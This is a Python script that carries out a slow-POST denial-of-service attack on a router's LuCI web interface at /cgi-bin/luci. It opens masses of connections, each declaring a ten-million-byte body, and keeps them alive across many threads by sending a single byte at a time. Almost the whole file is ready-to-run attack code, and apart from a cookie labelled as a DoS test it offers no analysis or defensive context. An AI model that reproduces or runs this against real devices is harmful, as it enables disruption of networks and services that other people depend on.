import socket
import time
import threading
 
#---------------------------
MAX_CONN=20000000
PORT=80
HOST="192.168.1.1"
PAGE="/cgi-bin/luci"
#---------------------------
 
buf=("POST %s HTTP/1.1\r\n"
"Host: %s\r\n"
"Content-Length: 10000000\r\n"
"Cookie: dklkt_dos_test\r\n"
"\r\n" % (PAGE,HOST))

socks=[]
  
def conn_thread():
    global socks
    for i in range(0,MAX_CONN):
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        try:
            s.connect((HOST,PORT))
            s.send(buf.encode())
            print ("Send buf OK!,conn=%d\n"%i)
            socks.append(s)
        except Exception as ex:
            print ("Could not connect to server or send error:%s"%ex)
            time.sleep(0.1)
#end def
  
def send_thread():
    global socks
    while True:
        for s in socks:
            try:
                s.send("f".encode())
                #print "send OK!"
            except Exception as ex:
                print ("Send Exception:%s\n"%ex)
                socks.remove(s)
                s.close()
        time.sleep(0.1)
#end def

conn_th1=threading.Thread(target=conn_thread,args=())
send_th1=threading.Thread(target=send_thread,args=())
conn_th2=threading.Thread(target=conn_thread,args=())
send_th2=threading.Thread(target=send_thread,args=())
conn_th3=threading.Thread(target=conn_thread,args=())
send_th3=threading.Thread(target=send_thread,args=())
conn_th4=threading.Thread(target=conn_thread,args=())
send_th4=threading.Thread(target=send_thread,args=())
conn_th5=threading.Thread(target=conn_thread,args=())
send_th5=threading.Thread(target=send_thread,args=())
conn_th6=threading.Thread(target=conn_thread,args=())
send_th6=threading.Thread(target=send_thread,args=())
conn_th7=threading.Thread(target=conn_thread,args=())
send_th7=threading.Thread(target=send_thread,args=())
conn_th8=threading.Thread(target=conn_thread,args=())
send_th8=threading.Thread(target=send_thread,args=())
conn_th9=threading.Thread(target=conn_thread,args=())
send_th9=threading.Thread(target=send_thread,args=())
conn_th12=threading.Thread(target=conn_thread,args=())
send_th12=threading.Thread(target=send_thread,args=())
conn_th13=threading.Thread(target=conn_thread,args=())
send_th13=threading.Thread(target=send_thread,args=())
conn_th14=threading.Thread(target=conn_thread,args=())
send_th14=threading.Thread(target=send_thread,args=())
conn_th15=threading.Thread(target=conn_thread,args=())
send_th15=threading.Thread(target=send_thread,args=())
conn_th16=threading.Thread(target=conn_thread,args=())
send_th16=threading.Thread(target=send_thread,args=())
conn_th17=threading.Thread(target=conn_thread,args=())
send_th17=threading.Thread(target=send_thread,args=())
conn_th18=threading.Thread(target=conn_thread,args=())
send_th18=threading.Thread(target=send_thread,args=())
conn_th19=threading.Thread(target=conn_thread,args=())
send_th19=threading.Thread(target=send_thread,args=())
conn_th20=threading.Thread(target=conn_thread,args=())
send_th20=threading.Thread(target=send_thread,args=())


conn_th1.start()
send_th1.start()
conn_th2.start()
send_th2.start()
conn_th3.start()
send_th3.start()
conn_th4.start()
send_th4.start()
conn_th5.start()
send_th5.start()
conn_th6.start()
send_th6.start()
conn_th7.start()
send_th7.start()
conn_th8.start()
send_th8.start()
conn_th9.start()
send_th9.start()
conn_th12.start()
send_th12.start()
conn_th13.start()
send_th13.start()
conn_th14.start()
send_th14.start()
conn_th15.start()
send_th15.start()
conn_th16.start()
send_th16.start()
conn_th17.start()
send_th17.start()
conn_th18.start()
send_th18.start()
conn_th19.start()
send_th19.start()
conn_th20.start()
send_th20.start()